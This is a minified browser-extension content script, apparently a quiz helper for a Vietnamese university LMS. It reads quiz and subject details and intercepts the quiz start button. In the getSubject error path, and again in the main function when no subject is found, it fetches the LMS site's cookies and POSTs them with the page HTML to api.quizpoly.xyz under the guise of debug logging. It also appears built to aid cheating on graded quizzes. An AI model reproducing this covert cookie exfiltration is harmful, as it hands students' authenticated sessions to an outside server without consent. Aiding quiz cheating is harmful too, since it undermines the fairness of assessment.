var server=window.location.origin,currentUrl=window.location.href,apiUrl="https://api.quizpoly.xyz/quizpoly",version=chrome.runtime.getManifest().version;async function sendHtml(e){try{var t=document.body.innerHTML.replaceAll("\n","").replaceAll("\t","");const o=await fetch(apiUrl+"/html",{method:"POST",mode:"cors",headers:{"Content-Type":"application/json"},body:JSON.stringify({note:`${version}: ${e}`,html:t})});var n=await o.json();console.debug(n.message)}catch(e){console.debug(e)}}function getSubject(n=document){let o="";if("lms-ptcd.poly.edu.vn"==window.location.host){const e=n.querySelector("ol>li:nth-of-type(5)>a");return e.textContent.replace("_","-").split("-")[1].split(":").pop().trim().replace("Môn ","")}try{let e=n.querySelector(".breadcrumb>.crumb:nth-of-type(6)");o=e.innerText.trim(),["2d, 3d animation - dựng phim","2d","cơ khí","tự động hoá","thiết kế cơ bản"].includes(o.toLowerCase())&&(e=n.querySelector(".breadcrumb>.crumb:nth-of-type(7)"),o=e.innerText.trim());let t=e.innerText.replace(/_/g,"-").split("-");return 1<t.length?(o=t[0].toLowerCase().includes("các lớp")?t[2]:t[1].split(":").pop(),o.includes("Chuyên đề")?o=o.split("Chuyên đề")[1].split(".").pop():o.includes(".")&&(o=o.split(".").pop())):o=t[0],o?o.replace("Môn ","").trim():""}catch(t){return console.debug(t),chrome.runtime.sendMessage({type:"get_cookies",domain:window.location.host},e=>{sendHtml(`getSubject error lms_start - ${e.cookie} - ${t}`)}),""}}function getQuizNumber(){try{let e=document.querySelector(".ilAccAnchor");return e=e||document.querySelector("#kioskTestTitle"),e?Number(e.textContent.replace(/[^0-9]/g,"")):0}catch(e){return sendHtml(`getQuizNumber: ${e}`),0}}async function main({quizNumber:e,subjectName:t},n){chrome.runtime.sendMessage({type:"open_quiz_popup"}),chrome.storage.local.remove("listQA"),chrome.storage.local.set({subjectName:t,quizNumber:e,isStart:!0},()=>{console.debug("set subject"),n()})}!function(){const e=document.querySelector(".navbar-form > input"),t=getSubject();t||chrome.runtime.sendMessage({type:"get_cookies",domain:window.location.host},e=>{sendHtml(`getSubject null lms_start - ${e.cookie}`)});const n=getQuizNumber();if(e){e.setAttribute("type","button");const o=e.cloneNode(!0);o.setAttribute("type","submit"),o.setAttribute("style","display:none"),document.querySelector(".navbar-form").appendChild(o),e.addEventListener("click",()=>{e.setAttribute("disabled",""),main({quizNumber:n,subjectName:t},()=>{console.debug("click"),o.setAttribute("type","submit"),o.dispatchEvent(new MouseEvent("click"))})})}}();